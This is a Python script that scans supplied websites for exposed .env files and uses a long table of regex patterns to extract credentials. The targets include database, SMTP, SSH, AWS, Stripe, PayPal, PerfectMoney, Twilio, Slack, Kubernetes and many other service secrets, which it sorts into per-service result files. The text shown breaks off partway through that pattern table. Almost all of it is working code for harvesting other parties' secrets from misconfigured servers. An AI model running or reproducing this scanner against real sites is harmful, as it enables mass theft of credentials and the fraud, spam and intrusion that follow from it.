#!/usr/bin/env python3
#lukontol
import re
import os
from pathlib import Path
from urllib.parse import urlparse
import requests
from concurrent.futures import ThreadPoolExecutor
from typing import List, Optional
from lib.tools.utils import banner, clear
from lib.tools.colors import wh, r, g, res

class EnvAuditor:
    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        self.results_dir = Path('Result/env-scanner')
        self.results_dir.mkdir(exist_ok=True)

    def validate_url(self, url: str) -> Optional[str]:
        url = url.strip()
        if not url:
            return None
        if not re.match(r'^https?://', url, re.I):
            url = f'http://{url}'
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                return None
            return url.rstrip('/')
        except ValueError:
            return None

    def check_env_paths(self, url: str, paths: List[str]) -> None:
        for path in paths:
            path = path.strip().lstrip('/')
            if not path:
                continue
            url_env = f"{url}/{path}"
            try:
                with requests.get(url_env, headers=self.headers, timeout=self.timeout) as req:
                    if req.status_code == 200 and '.env' in path.lower():
                        print(f"[INFO] Found .env at {url_env}")
                        self.process_env(url, req.text)
                    else:
                        print(f"[DEBUG] No .env at {url_env} (Status: {req.status_code})")
            except requests.ConnectionError:
                print(f"[ERROR] Connection error for {url_env}")
            except requests.Timeout:
                print(f"[ERROR] Timeout for {url_env}")
            except requests.RequestException as e:
                print(f"[ERROR] Request failed for {url_env}: {e}")

    def process_env(self, url: str, content: str) -> None:
        results = []
        env_patterns = {
            'app': {
                'keywords': ['APP_'],
                'patterns': [
                    r'APP_NAME=(.+?)(?:\r?\n|$)',
                    r'APP_ENV=(.+?)(?:\r?\n|$)',
                    r'APP_KEY=(.+?)(?:\r?\n|$)',
                    r'APP_DEBUG=(.+?)(?:\r?\n|$)',
                    r'APP_LOG_LEVEL=(.+?)(?:\r?\n|$)',
                    r'APP_URL=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'APP_NAME',
                'filename': 'app_env.txt'
            },
            'db': {
                'keywords': ['DB_'],
                'patterns': [
                    r'DB_CONNECTION=(.+?)(?:\r?\n|$)',
                    r'DB_HOST=(.+?)(?:\r?\n|$)',
                    r'DB_PORT=(.+?)(?:\r?\n|$)',
                    r'DB_DATABASE=(.+?)(?:\r?\n|$)',
                    r'DB_USERNAME=(.+?)(?:\r?\n|$)',
                    r'DB_PASSWORD=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'DB_HOST',
                'filename': 'db.txt'
            },
            'mail': {
                'keywords': ['MAIL_'],
                'patterns': [
                    r'MAIL_DRIVER=(.+?)(?:\r?\n|$)',
                    r'MAIL_HOST=(.+?)(?:\r?\n|$)',
                    r'MAIL_PORT=(.+?)(?:\r?\n|$)',
                    r'MAIL_USERNAME=(.+?)(?:\r?\n|$)',
                    r'MAIL_PASSWORD=(.+?)(?:\r?\n|$)',
                    r'MAIL_ENCRYPTION=(.+?)(?:\r?\n|$)',
                    r'MAIL_FROM_ADDRESS=(.+?)(?:\r?\n|$)',
                    r'MAIL_FROM_NAME=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'MAIL_HOST',
                'filename': 'smtp.txt'
            },
            'ssh': {
                'keywords': ['SSH_'],
                'patterns': [
                    r'SSH_HOST=(.+?)(?:\r?\n|$)',
                    r'SSH_USERNAME=(.+?)(?:\r?\n|$)',
                    r'SSH_PASSWORD=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'SSH_HOST',
                'filename': 'ssh.txt'
            },
            'aws': {
                'keywords': ['AWS_', 'SES_'],
                'patterns': [
                    r'AWS_ACCESS_KEY=(.+?)(?:\r?\n|$)',
                    r'AWS_SECRET=(.+?)(?:\r?\n|$)',
                    r'AWS_ACCESS_KEY_ID=(.+?)(?:\r?\n|$)',
                    r'AWS_SECRET_ACCESS_KEY=(.+?)(?:\r?\n|$)',
                    r'AWS_S3_KEY=(.+?)(?:\r?\n|$)',
                    r'AWS_BUCKET=(.+?)(?:\r?\n|$)',
                    r'AWS_SES_KEY=(.+?)(?:\r?\n|$)',
                    r'AWS_SES_SECRET=(.+?)(?:\r?\n|$)',
                    r'SES_KEY=(.+?)(?:\r?\n|$)',
                    r'SES_SECRET=(.+?)(?:\r?\n|$)',
                    r'AWS_REGION=(.+?)(?:\r?\n|$)',
                    r'AWS_DEFAULT_REGION=(.+?)(?:\r?\n|$)',
                    r'SES_USERNAME=(.+?)(?:\r?\n|$)',
                    r'SES_PASSWORD=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'AWS_ACCESS_KEY_ID',
                'filename': 'aws.txt'
            },
            'twilio': {
                'keywords': ['TWILIO_'],
                'patterns': [
                    r'TWILIO_ACCOUNT_SID=(.+?)(?:\r?\n|$)',
                    r'TWILIO_API_KEY=(.+?)(?:\r?\n|$)',
                    r'TWILIO_API_SECRET=(.+?)(?:\r?\n|$)',
                    r'TWILIO_CHAT_SERVICE_SID=(.+?)(?:\r?\n|$)',
                    r'TWILIO_AUTH_TOKEN=(.+?)(?:\r?\n|$)',
                    r'TWILIO_NUMBER=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'TWILIO_ACCOUNT_SID',
                'filename': 'twilio.txt'
            },
            'blockchain': {
                'keywords': ['BLOCKCHAIN_'],
                'patterns': [
                    r'BLOCKCHAIN_API=(.+?)(?:\r?\n|$)',
                    r'DEFAULT_BTC_FEE=(.+?)(?:\r?\n|$)',
                    r'TRANSACTION_BTC_FEE=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'BLOCKCHAIN_API',
                'filename': 'btc.txt'
            },
            'perfectmoney': {
                'keywords': ['PM_'],
                'patterns': [
                    r'PM_ACCOUNTID=(.+?)(?:\r?\n|$)',
                    r'PM_PASSPHRASE=(.+?)(?:\r?\n|$)',
                    r'PM_CURRENT_ACCOUNT=(.+?)(?:\r?\n|$)',
                    r'PM_MARCHANTID=(.+?)(?:\r?\n|$)',
                    r'PM_MARCHANT_NAME=(.+?)(?:\r?\n|$)',
                    r'PM_UNITS=(.+?)(?:\r?\n|$)',
                    r'PM_ALT_PASSPHRASE=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'PM_ACCOUNTID',
                'filename': 'perfectmoney.txt'
            },
            'plivo': {
                'keywords': ['PLIVO_'],
                'patterns': [
                    r'PLIVO_AUTH_ID=(.+?)(?:\r?\n|$)',
                    r'PLIVO_AUTH_TOKEN=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'PLIVO_AUTH_ID',
                'filename': 'plivo.txt'
            },
            'nexmo': {
                'keywords': ['NEXMO_'],
                'patterns': [
                    r'NEXMO_KEY=(.+?)(?:\r?\n|$)',
                    r'NEXMO_SECRET=(.+?)(?:\r?\n|$)',
                    r'NEXMO_NUMBER=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'NEXMO_KEY',
                'filename': 'nexmo.txt'
            },
            'razorpay': {
                'keywords': ['RAZORPAY_'],
                'patterns': [
                    r'RAZORPAY_KEY=(.+?)(?:\r?\n|$)',
                    r'RAZORPAY_SECRET=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'RAZORPAY',
                'filename': 'razorpay.txt'
            },
            'paypal': {
                'keywords': ['PAYPAL_'],
                'patterns': [
                    r'PAYPAL_CLIENT_ID=(.+?)(?:\r?\n|$)',
                    r'PAYPAL_SECRET=(.+?)(?:\r?\n|$)',
                    r'PAYPAL_MODE=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'PAYPAL_CLIENT_ID',
                'filename': 'paypal.txt'
            },
            'stripe': {
                'keywords': ['STRIPE_'],
                'patterns': [
                    r'STRIPE_KEY=(.+?)(?:\r?\n|$)',
                    r'STRIPE_SECRET=(.+?)(?:\r?\n|$)',
                    r'STRIPE_PUBLIC_KEY=(.+?)(?:\r?\n|$)',
                    r'STRIPE_SECRET_KEY=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'STRIPE_KEY',
                'filename': 'stripe.txt'
            },
            'oauth': {
                'keywords': ['OAUTH_', 'GOOGLE_', 'FACEBOOK_', 'GITHUB_'],
                'patterns': [
                    r'GOOGLE_CLIENT_ID=(.+?)(?:\r?\n|$)',
                    r'GOOGLE_CLIENT_SECRET=(.+?)(?:\r?\n|$)',
                    r'FACEBOOK_CLIENT_ID=(.+?)(?:\r?\n|$)',
                    r'FACEBOOK_CLIENT_SECRET=(.+?)(?:\r?\n|$)',
                    r'GITHUB_CLIENT_ID=(.+?)(?:\r?\n|$)',
                    r'GITHUB_CLIENT_SECRET=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'GOOGLE_CLIENT_ID',
                'filename': 'oauth.txt'
            },
            'google_services': {
                'keywords': ['GOOGLE_'],
                'patterns': [
                    r'GOOGLE_MAPS_API_KEY=(.+?)(?:\r?\n|$)',
                    r'GOOGLE_RECAPTCHA_KEY=(.+?)(?:\r?\n|$)',
                    r'GOOGLE_RECAPTCHA_SECRET=(.+?)(?:\r?\n|$)',
                    r'GOOGLE_APPLICATION_CREDENTIALS=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'GOOGLE_MAPS_API_KEY',
                'filename': 'google.txt'
            },
            'mercadopago': {
                'keywords': ['MERCADOPAGO_'],
                'patterns': [
                    r'MERCADOPAGO_PUBLIC_KEY=(.+?)(?:\r?\n|$)',
                    r'MERCADOPAGO_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
                    r'MERCADOPAGO_CLIENT_SECRET=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'MERCADOPAGO_PUBLIC_KEY',
                'filename': 'mercadopago.txt'
            },
            'recaptcha': {
                'keywords': ['RECAPTCHA_'],
                'patterns': [
                    r'RECAPTCHA_SITE_KEY=(.+?)(?:\r?\n|$)',
                    r'RECAPTCHA_SECRET_KEY=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'RECAPTCHA_SITE_KEY',
                'filename': 'recaptcha.txt'
            },
            'pusher': {
                'keywords': ['PUSHER_'],
                'patterns': [
                    r'PUSHER_APP_ID=(.+?)(?:\r?\n|$)',
                    r'PUSHER_APP_KEY=(.+?)(?:\r?\n|$)',
                    r'PUSHER_APP_SECRET=(.+?)(?:\r?\n|$)',
                    r'PUSHER_APP_CLUSTER=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'PUSHER_APP_ID',
                'filename': 'pusher.txt'
            },
            'postmark': {
                'keywords': ['POSTMARK_'],
                'patterns': [
                    r'POSTMARK_TOKEN=(.+?)(?:\r?\n|$)',
                    r'POSTMARK_SECRET=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'POSTMARK_TOKEN',
                'filename': 'postmark.txt'
            },
            'bitpay': {
                'keywords': ['BITPAY_'],
                'patterns': [
                    r'BITPAY_API_KEY=(.+?)(?:\r?\n|$)',
                    r'BITPAY_PRIVATE_KEY=(.+?)(?:\r?\n|$)'
                ],
                'must_have': 'BITPAY_API_KEY',
                'filename': 'bitpay.txt'
			},
			'firebase': {
					'keywords': ['FIREBASE_'],
					'patterns': [
						r'FIREBASE_API_KEY=(.+?)(?:\r?\n|$)',
						r'FIREBASE_AUTH_DOMAIN=(.+?)(?:\r?\n|$)',
						r'FIREBASE_PROJECT_ID=(.+?)(?:\r?\n|$)',
						r'FIREBASE_STORAGE_BUCKET=(.+?)(?:\r?\n|$)',
						r'FIREBASE_MESSAGING_SENDER_ID=(.+?)(?:\r?\n|$)',
						r'FIREBASE_APP_ID=(.+?)(?:\r?\n|$)',
						r'FIREBASE_MEASUREMENT_ID=(.+?)(?:\r?\n|$)'
					],
					'must_have': 'FIREBASE_API_KEY',
					'filename': 'firebase.txt'
				},
			# SendGrid configuration
			'sendgrid': {
				'keywords': ['SENDGRID_'],
				'patterns': [
					r'SENDGRID_API_KEY=(.+?)(?:\r?\n|$)',
					r'SENDGRID_FROM_EMAIL=(.+?)(?:\r?\n|$)',
					r'SENDGRID_FROM_NAME=(.+?)(?:\r?\n|$)'
				],
				'must_have': 'SENDGRID_API_KEY',
				'filename': 'sendgrid.txt'
			},
			# Slack configuration
			'slack': {
				'keywords': ['SLACK_'],
				'patterns': [
					r'SLACK_TOKEN=(.+?)(?:\r?\n|$)',
					r'SLACK_SIGNING_SECRET=(.+?)(?:\r?\n|$)',
					r'SLACK_BOT_TOKEN=(.+?)(?:\r?\n|$)',
					r'SLACK_APP_TOKEN=(.+?)(?:\r?\n|$)'
				],
				'must_have': 'SLACK_TOKEN',
				'filename': 'slack.txt'
			},
			# MongoDB configuration
			'mongodb': {
				'keywords': ['MONGO_'],
				'patterns': [
					r'MONGO_URI=(.+?)(?:\r?\n|$)',
					r'MONGO_HOST=(.+?)(?:\r?\n|$)',
					r'MONGO_PORT=(.+?)(?:\r?\n|$)',
					r'MONGO_DATABASE=(.+?)(?:\r?\n|$)',
					r'MONGO_USERNAME=(.+?)(?:\r?\n|$)',
					r'MONGO_PASSWORD=(.+?)(?:\r?\n|$)'
				],
				'must_have': 'MONGO_URI',
				'filename': 'mongodb.txt'
			},
			# Redis configuration
			'redis': {
				'keywords': ['REDIS_'],
				'patterns': [
					r'REDIS_HOST=(.+?)(?:\r?\n|$)',
					r'REDIS_PORT=(.+?)(?:\r?\n|$)',
					r'REDIS_PASSWORD=(.+?)(?:\r?\n|$)',
					r'REDIS_URL=(.+?)(?:\r?\n|$)'
				],
				'must_have': 'REDIS_HOST',
				'filename': 'redis.txt'
			},
			# JWT configuration
			'jwt': {
				'keywords': ['JWT_'],
				'patterns': [
					r'JWT_SECRET=(.+?)(?:\r?\n|$)',
					r'JWT_ALGORITHM=(.+?)(?:\r?\n|$)',
					r'JWT_EXPIRE_MINUTES=(.+?)(?:\r?\n|$)'
				],
				'must_have': 'JWT_SECRET',
				'filename': 'jwt.txt'
			},
			# New Relic configuration
			'newrelic': {
				'keywords': ['NEW_RELIC_'],
				'patterns': [
					r'NEW_RELIC_LICENSE_KEY=(.+?)(?:\r?\n|$)',
					r'NEW_RELIC_APP_NAME=(.+?)(?:\r?\n|$)',
					r'NEW_RELIC_API_KEY=(.+?)(?:\r?\n|$)'
				],
				'must_have': 'NEW_RELIC_LICENSE_KEY',
				'filename': 'newrelic.txt'
			},
			# Cloudinary configuration
			'cloudinary': {
				'keywords': ['CLOUDINARY_'],
				'patterns': [
					r'CLOUDINARY_CLOUD_NAME=(.+?)(?:\r?\n|$)',
					r'CLOUDINARY_API_KEY=(.+?)(?:\r?\n|$)',
					r'CLOUDINARY_API_SECRET=(.+?)(?:\r?\n|$)'
				],
				'must_have': 'CLOUDINARY_CLOUD_NAME',
				'filename': 'cloudinary.txt'
			},
			# Algolia configuration
			'algolia': {
				'keywords': ['ALGOLIA_'],
				'patterns': [
					r'ALGOLIA_APP_ID=(.+?)(?:\r?\n|$)',
					r'ALGOLIA_API_KEY=(.+?)(?:\r?\n|$)',
					r'ALGOLIA_SEARCH_KEY=(.+?)(?:\r?\n|$)'
				],
				'must_have': 'ALGOLIA_APP_ID',
				'filename': 'algolia.txt'
			},
			# Heroku configuration
			'heroku': {
				'keywords': ['HEROKU_'],
				'patterns': [
					r'HEROKU_API_KEY=(.+?)(?:\r?\n|$)',
					r'HEROKU_APP_NAME=(.+?)(?:\r?\n|$)',
					r'HEROKU_AUTH_TOKEN=(.+?)(?:\r?\n|$)'
				],
				'must_have': 'HEROKU_API_KEY',
				'filename': 'heroku.txt'

            },
            'airtable': {
        'keywords': ['AIRTABLE_'],
        'patterns': [
            r'AIRTABLE_API_KEY=(.+?)(?:\r?\n|$)',
            r'AIRTABLE_BASE_ID=(.+?)(?:\r?\n|$)',
            r'AIRTABLE_TABLE_NAME=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'AIRTABLE_API_KEY',
        'filename': 'airtable.txt'
    },
    # Dropbox configuration
    'dropbox': {
        'keywords': ['DROPBOX_'],
        'patterns': [
            r'DROPBOX_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
            r'DROPBOX_APP_KEY=(.+?)(?:\r?\n|$)',
            r'DROPBOX_APP_SECRET=(.+?)(?:\r?\n|$)',
            r'DROPBOX_REFRESH_TOKEN=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'DROPBOX_ACCESS_TOKEN',
        'filename': 'dropbox.txt'
    },
    # GitLab configuration
    'gitlab': {
        'keywords': ['GITLAB_'],
        'patterns': [
            r'GITLAB_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
            r'GITLAB_CLIENT_ID=(.+?)(?:\r?\n|$)',
            r'GITLAB_CLIENT_SECRET=(.+?)(?:\r?\n|$)',
            r'GITLAB_URL=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'GITLAB_ACCESS_TOKEN',
        'filename': 'gitlab.txt'
    },
    # Elasticsearch configuration
    'elasticsearch': {
        'keywords': ['ELASTICSEARCH_', 'ES_'],
        'patterns': [
            r'ELASTICSEARCH_HOST=(.+?)(?:\r?\n|$)',
            r'ELASTICSEARCH_PORT=(.+?)(?:\r?\n|$)',
            r'ELASTICSEARCH_USERNAME=(.+?)(?:\r?\n|$)',
            r'ELASTICSEARCH_PASSWORD=(.+?)(?:\r?\n|$)',
            r'ELASTICSEARCH_URL=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'ELASTICSEARCH_HOST',
        'filename': 'elasticsearch.txt'
    },
    # RabbitMQ configuration
    'rabbitmq': {
        'keywords': ['RABBITMQ_'],
        'patterns': [
            r'RABBITMQ_HOST=(.+?)(?:\r?\n|$)',
            r'RABBITMQ_PORT=(.+?)(?:\r?\n|$)',
            r'RABBITMQ_USERNAME=(.+?)(?:\r?\n|$)',
            r'RABBITMQ_PASSWORD=(.+?)(?:\r?\n|$)',
            r'RABBITMQ_VHOST=(.+?)(?:\r?\n|$)',
            r'RABBITMQ_URL=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'RABBITMQ_HOST',
        'filename': 'rabbitmq.txt'
    },
    # Square configuration
    'square': {
        'keywords': ['SQUARE_'],
        'patterns': [
            r'SQUARE_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
            r'SQUARE_APPLICATION_ID=(.+?)(?:\r?\n|$)',
            r'SQUARE_LOCATION_ID=(.+?)(?:\r?\n|$)',
            r'SQUARE_ENV=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'SQUARE_ACCESS_TOKEN',
        'filename': 'square.txt'
    },
    # Mailgun configuration
    'mailgun': {
        'keywords': ['MAILGUN_'],
        'patterns': [
            r'MAILGUN_API_KEY=(.+?)(?:\r?\n|$)',
            r'MAILGUN_DOMAIN=(.+?)(?:\r?\n|$)',
            r'MAILGUN_SECRET=(.+?)(?:\r?\n|$)',
            r'MAILGUN_FROM_EMAIL=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'MAILGUN_API_KEY',
        'filename': 'mailgun.txt'
    },
    # Auth0 configuration
    'auth0': {
        'keywords': ['AUTH0_'],
        'patterns': [
            r'AUTH0_CLIENT_ID=(.+?)(?:\r?\n|$)',
            r'AUTH0_CLIENT_SECRET=(.+?)(?:\r?\n|$)',
            r'AUTH0_DOMAIN=(.+?)(?:\r?\n|$)',
            r'AUTH0_AUDIENCE=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'AUTH0_CLIENT_ID',
        'filename': 'auth0.txt'
    },
    # Intercom configuration
    'intercom': {
        'keywords': ['INTERCOM_'],
        'patterns': [
            r'INTERCOM_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
            r'INTERCOM_APP_ID=(.+?)(?:\r?\n|$)',
            r'INTERCOM_API_KEY=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'INTERCOM_ACCESS_TOKEN',
        'filename': 'intercom.txt'
    },
    # Zendesk configuration
    'zendesk': {
        'keywords': ['ZENDESK_'],
        'patterns': [
            r'ZENDESK_SUBDOMAIN=(.+?)(?:\r?\n|$)',
            r'ZENDESK_API_TOKEN=(.+?)(?:\r?\n|$)',
            r'ZENDESK_EMAIL=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'ZENDESK_API_TOKEN',
        'filename': 'zendesk.txt'
    },
    # DigitalOcean configuration
    'digitalocean': {
        'keywords': ['DIGITALOCEAN_'],
        'patterns': [
            r'DIGITALOCEAN_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
            r'DIGITALOCEAN_SPACES_KEY=(.+?)(?:\r?\n|$)',
            r'DIGITALOCEAN_SPACES_SECRET=(.+?)(?:\r?\n|$)',
            r'DIGITALOCEAN_REGION=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'DIGITALOCEAN_ACCESS_TOKEN',
        'filename': 'digitalocean.txt'
    },
    # OneSignal configuration
    'onesignal': {
        'keywords': ['ONESIGNAL_'],
        'patterns': [
            r'ONESIGNAL_APP_ID=(.+?)(?:\r?\n|$)',
            r'ONESIGNAL_API_KEY=(.+?)(?:\r?\n|$)',
            r'ONESIGNAL_REST_API_KEY=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'ONESIGNAL_APP_ID',
        'filename': 'onesignal.txt'
    },
    # Sentry configuration
    'sentry': {
        'keywords': ['SENTRY_'],
        'patterns': [
            r'SENTRY_DSN=(.+?)(?:\r?\n|$)',
            r'SENTRY_AUTH_TOKEN=(.+?)(?:\r?\n|$)',
            r'SENTRY_ENVIRONMENT=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'SENTRY_DSN',
        'filename': 'sentry.txt'
    },
    # Mixpanel configuration
    'mixpanel': {
        'keywords': ['MIXPANEL_'],
        'patterns': [
            r'MIXPANEL_TOKEN=(.+?)(?:\r?\n|$)',
            r'MIXPANEL_PROJECT_ID=(.+?)(?:\r?\n|$)',
            r'MIXPANEL_API_SECRET=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'MIXPANEL_TOKEN',
        'filename': 'mixpanel.txt'
    },
    # Firebase Cloud Messaging (FCM)
    'fcm': {
        'keywords': ['FCM_'],
        'patterns': [
            r'FCM_SERVER_KEY=(.+?)(?:\r?\n|$)',
            r'FCM_SENDER_ID=(.+?)(?:\r?\n|$)',
            r'FCM_API_KEY=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'FCM_SERVER_KEY',
        'filename': 'fcm.txt'
    },
    # Kubernetes configuration
    'kubernetes': {
        'keywords': ['KUBE_', 'KUBERNETES_'],
        'patterns': [
            r'KUBERNETES_API_TOKEN=(.+?)(?:\r?\n|$)',
            r'KUBERNETES_API_URL=(.+?)(?:\r?\n|$)',
            r'KUBERNETES_NAMESPACE=(.+?)(?:\r?\n|$)',
            r'KUBERNETES_SERVICE_ACCOUNT_TOKEN=(.+?)(?:\r?\n|$)',
            r'KUBECONFIG=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'KUBERNETES_API_TOKEN',
        'filename': 'kubernetes.txt'
    },
    # Salesforce configuration
    'salesforce': {
        'keywords': ['SALESFORCE_'],
        'patterns': [
            r'SALESFORCE_CLIENT_ID=(.+?)(?:\r?\n|$)',
            r'SALESFORCE_CLIENT_SECRET=(.+?)(?:\r?\n|$)',
            r'SALESFORCE_USERNAME=(.+?)(?:\r?\n|$)',
            r'SALESFORCE_PASSWORD=(.+?)(?:\r?\n|$)',
            r'SALESFORCE_SECURITY_TOKEN=(.+?)(?:\r?\n|$)',
            r'SALESFORCE_ACCESS_TOKEN=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'SALESFORCE_CLIENT_ID',
        'filename': 'salesforce.txt'
    },
    # Shopify configuration
    'shopify': {
        'keywords': ['SHOPIFY_'],
        'patterns': [
            r'SHOPIFY_API_KEY=(.+?)(?:\r?\n|$)',
            r'SHOPIFY_API_SECRET=(.+?)(?:\r?\n|$)',
            r'SHOPIFY_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
            r'SHOPIFY_SHOP_DOMAIN=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'SHOPIFY_API_KEY',
        'filename': 'shopify.txt'
    },
    # Datadog configuration
    'datadog': {
        'keywords': ['DATADOG_'],
        'patterns': [
            r'DATADOG_API_KEY=(.+?)(?:\r?\n|$)',
            r'DATADOG_APP_KEY=(.+?)(?:\r?\n|$)',
            r'DATADOG_HOST=(.+?)(?:\r?\n|$)',
            r'DATADOG_SITE=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'DATADOG_API_KEY',
        'filename': 'datadog.txt'
    },
    # HubSpot configuration
    'hubspot': {
        'keywords': ['HUBSPOT_'],
        'patterns': [
            r'HUBSPOT_API_KEY=(.+?)(?:\r?\n|$)',
            r'HUBSPOT_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
            r'HUBSPOT_CLIENT_ID=(.+?)(?:\r?\n|$)',
            r'HUBSPOT_CLIENT_SECRET=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'HUBSPOT_API_KEY',
        'filename': 'hubspot.txt'
    },
    # Twilio SendGrid (alternative naming)
    'twilio_sendgrid': {
        'keywords': ['SENDGRID_'],  # Distinct from previous sendgrid for alternative naming
        'patterns': [
            r'SENDGRID_API_KEY=(.+?)(?:\r?\n|$)',
            r'SENDGRID_API_SECRET=(.+?)(?:\r?\n|$)',
            r'SENDGRID_SENDER_ID=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'SENDGRID_API_KEY',
        'filename': 'twilio_sendgrid.txt'
    },
    # CircleCI configuration
    'circleci': {
        'keywords': ['CIRCLECI_'],
        'patterns': [
            r'CIRCLECI_TOKEN=(.+?)(?:\r?\n|$)',
            r'CIRCLECI_PROJECT_SLUG=(.+?)(?:\r?\n|$)',
            r'CIRCLECI_API_KEY=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'CIRCLECI_TOKEN',
        'filename': 'circleci.txt'
    },
    # PagerDuty configuration
    'pagerduty': {
        'keywords': ['PAGERDUTY_'],
        'patterns': [
            r'PAGERDUTY_API_KEY=(.+?)(?:\r?\n|$)',
            r'PAGERDUTY_TOKEN=(.+?)(?:\r?\n|$)',
            r'PAGERDUTY_SERVICE_ID=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'PAGERDUTY_API_KEY',
        'filename': 'pagerduty.txt'
    },
    # Snowflake configuration
    'snowflake': {
        'keywords': ['SNOWFLAKE_'],
        'patterns': [
            r'SNOWFLAKE_ACCOUNT=(.+?)(?:\r?\n|$)',
            r'SNOWFLAKE_USER=(.+?)(?:\r?\n|$)',
            r'SNOWFLAKE_PASSWORD=(.+?)(?:\r?\n|$)',
            r'SNOWFLAKE_DATABASE=(.+?)(?:\r?\n|$)',
            r'SNOWFLAKE_WAREHOUSE=(.+?)(?:\r?\n|$)',
            r'SNOWFLAKE_ROLE=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'SNOWFLAKE_ACCOUNT',
        'filename': 'snowflake.txt'
    },
    # Okta configuration
    'okta': {
        'keywords': ['OKTA_'],
        'patterns': [
            r'OKTA_CLIENT_ID=(.+?)(?:\r?\n|$)',
            r'OKTA_CLIENT_SECRET=(.+?)(?:\r?\n|$)',
            r'OKTA_DOMAIN=(.+?)(?:\r?\n|$)',
            r'OKTA_API_TOKEN=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'OKTA_CLIENT_ID',
        'filename': 'okta.txt'
    },
    # Amplitude configuration
    'amplitude': {
        'keywords': ['AMPLITUDE_'],
        'patterns': [
            r'AMPLITUDE_API_KEY=(.+?)(?:\r?\n|$)',
            r'AMPLITUDE_SECRET_KEY=(.+?)(?:\r?\n|$)',
            r'AMPLITUDE_PROJECT_ID=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'AMPLITUDE_API_KEY',
        'filename': 'amplitude.txt'
    },
    # Firebase Admin SDK
    'firebase_admin': {
        'keywords': ['FIREBASE_ADMIN_'],
        'patterns': [
            r'FIREBASE_ADMIN_PROJECT_ID=(.+?)(?:\r?\n|$)',
            r'FIREBASE_ADMIN_PRIVATE_KEY_ID=(.+?)(?:\r?\n|$)',
            r'FIREBASE_ADMIN_PRIVATE_KEY=(.+?)(?:\r?\n|$)',
            r'FIREBASE_ADMIN_CLIENT_EMAIL=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'FIREBASE_ADMIN_PROJECT_ID',
        'filename': 'firebase_admin.txt'
    },
    # Vercel configuration
    'vercel': {
        'keywords': ['VERCEL_'],
        'patterns': [
            r'VERCEL_TOKEN=(.+?)(?:\r?\n|$)',
            r'VERCEL_PROJECT_ID=(.+?)(?:\r?\n|$)',
            r'VERCEL_TEAM_ID=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'VERCEL_TOKEN',
        'filename': 'vercel.txt'
    },
    # Netlify configuration
    'netlify': {
        'keywords': ['NETLIFY_'],
        'patterns': [
            r'NETLIFY_AUTH_TOKEN=(.+?)(?:\r?\n|$)',
            r'NETLIFY_SITE_ID=(.+?)(?:\r?\n|$)',
            r'NETLIFY_API_KEY=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'NETLIFY_AUTH_TOKEN',
        'filename': 'netlify.txt'
    },
    # Supabase configuration
    'supabase': {
        'keywords': ['SUPABASE_'],
        'patterns': [
            r'SUPABASE_URL=(.+?)(?:\r?\n|$)',
            r'SUPABASE_KEY=(.+?)(?:\r?\n|$)',
            r'SUPABASE_SERVICE_ROLE_KEY=(.+?)(?:\r?\n|$)',
            r'SUPABASE_ANON_KEY=(.+?)(?:\r?\n|$)'
        ],
        'must_have': 'SUPABASE_URL',
        'filename': 'supabase.txt'
    },
    # Asana configuration
    'asana': {
        'keywords': ['ASANA_'],
        'patterns': [
            r'ASANA_ACCESS_TOKEN=(.+?)(?:\r?\n|$)',
            r'ASANA_CLIENT_ID=(.+?)(?:\r?\n|$)',
            r'ASANA_CLIENT_SECRET=(.+?)(?:\r?\n|$)',
